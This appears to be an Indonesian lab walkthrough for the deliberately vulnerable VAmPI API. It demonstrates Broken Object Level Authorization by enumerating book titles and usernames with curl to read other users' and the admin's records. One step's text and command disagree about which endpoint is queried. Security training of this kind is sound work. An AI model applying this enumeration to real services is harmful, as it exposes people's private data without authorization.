# Broken Object Level Authorization
Penyerang dapat mengeksploitasi endpoint API yang rentan terhadap Broken Object Level Authorization (BOLA) / IDOR (Insecure Direct Object Reference) dengan memanipulasi ID objek yang dikirimkan dalam request. ID Objek dapat berupa apa saja, mulai dari bilangan bulat berurutan, UUID, atau string. Akses tidak sah terhadap objek pengguna lain dapat mengakibatkan pengungkapan data kepada pihak yang tidak berwenang, kehilangan data, atau manipulasi data. Celah keamanan ini ditemukan pada endpoint `/books/v1/{book_title}` dan `/users/v1/{username}`

- Login terlebih dahulu untuk mengakses endpoint `/books/v1/{book_title}` dengan akun yang sudah dibuat di proses instalasi kemudian copy nilai `auth_token`
```sh
curl http://IP_Server:5000/users/v1/login -d '{"username":"userapi","password":"12345"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%201.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%202.JPG)

- Akses endpoint `/books/v1/{book_title}` dan isi parameter `{book_title}` dengan format `bookTitle<nomor>`. Nomor bisa diganti dengan angka bulat (integer) berapapun hingga menemukan data, misalnya angka 1-100
```sh
curl http://IP_Server:5000/books/v1/bookTitle91 -H 'Authorization: Bearer token' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%204.JPG)

- Akses endpoint dengan nilai paramter lainnya. Jika `auth_token` sudah expired silahkan lakukan login ulang copy nilai `auth_token` yang baru
```sh
curl http://IP_Server:5000/books/v1/bookTitle92 -H 'Authorization: Bearer token' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%205.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%206.JPG)

- Kita menemukan data buku milik admin dengan `bookTitle15`
```sh
curl http://IP_Server:5000/books/v1/bookTitle15 -H 'Authorization: Bearer token' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%207.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%208.JPG)

- Pada endpoint `/books/v1/{book_title}` kita mengakses data milik pengguna lain dengan menebak urutan parameter **book_title** seperti `bookTitle91`, `bookTitle92` dan `bookTitle15`. Angka 15, 91, dan 92 adalah contoh angka bulat yang berurutan antara 1-100. Seharusnya data tersebut tidak dapat dibaca oleh user yang bersangkutan. Inilah yang disebut dengan celah keamanan Broken Object Level Authorization (BOLA). Jika kita mengakses endpoint `/books/v1/{book_title}` tanpa parameter, kita dapat memperoleh seluruh data buku
```sh
curl http://IP_Server:5000/users/v1 --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%209.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%2010.JPG)

- Sekarang kita coba akses endpoint `/users/v1/{username}` dan isi parameter `{username}` dengan format `name<nomor>`. Nomor bisa diganti dengan angka bulat (integer) berapapun hingga menemukan data, misalnya angka 1-100
```sh
curl http://IP_Server:5000/users/v1/name1 --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%2011.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%2012.JPG)

```sh
curl http://IP_Server:5000/users/v1/name2 --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%2013.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%2014.JPG)

```sh
curl http://IP_Server:5000/users/v1/admin --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%2015.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%2016.JPG)

- Pada endpoint `/users/v1/{username}` kita juga bisa mengakses data user dengan menebak urutan **username** seperti `name1` dan `name2`. Selain itu kita juga bisa menemukan data dengan username `admin`. Angka 1 dan 2 adalah contoh angka bulat yang berurutan antara 1-100. Sedangkan username `admin` adalah contoh username yang biasa digunakan untuk administrator. Seharusnya data tiap user hanya bisa diakses oleh user yang berwenang. Jika kita mengakses endpoint `/users/v1/{username}` tanpa parameter, kita dapat melihat seluruh data user
```sh
curl http://IP_Server:5000/users/v1 --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%2017.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/broken%20object%20level%20authorization/idor%2018.JPG)

